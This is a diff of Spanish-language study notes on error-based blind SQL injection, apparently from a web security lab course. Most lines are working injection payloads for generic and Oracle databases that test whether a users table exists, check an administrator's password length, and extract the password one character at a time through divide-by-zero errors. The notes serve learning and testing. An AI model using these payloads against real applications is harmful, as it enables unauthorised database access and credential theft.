@@ -32,7 +32,7 @@ xyz' || (SELECT '') || '
 xyz' || (SELECT '' FROM DUAL) || '
 
 Y validar si la tabla existe:
-xyz' || (SELECT '' FROM users) || '
+xyz' || (SELECT '' FROM users LIMIT 1) || '
 O en Oracle
 xyz' || (SELECT '' FROM users WHERE ROWNUM = 1) || ' 
 
@@ -53,14 +53,16 @@ Con el segundo input, evalúa a 1/0, lo que causa un error de división por cero
 Si el error causa una diferencia en la respuesta HTTP de la aplicación, puedes usar esto para determinar si la condición inyectada es verdadera.
 
 Usando esta técnica, puedes recuperar datos probando un carácter a la vez:
+xyz' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM users)='a
 
-xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+Incluso, podemos verificar el largo del password:
+xyz' AND (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 1) THEN 1/0 ELSE 'a' END FROM users)='a
 
 y en Oracle primero validar si existe el user:
 xyz' AND (SELECT CASE WHEN (username = 'administrator' AND 1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1)='a
 
 Y luego:
-xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTR(Password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM Users WHERE ROWNUM = 1)='a
+xyz' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1)='a
 
 Nota: Hay diferentes maneras de desencadenar errores condicionales, y diferentes técnicas funcionan mejor en diferentes tipos de bases de datos.
 Para más detalles, consulta la hoja de trucos de inyección SQL.
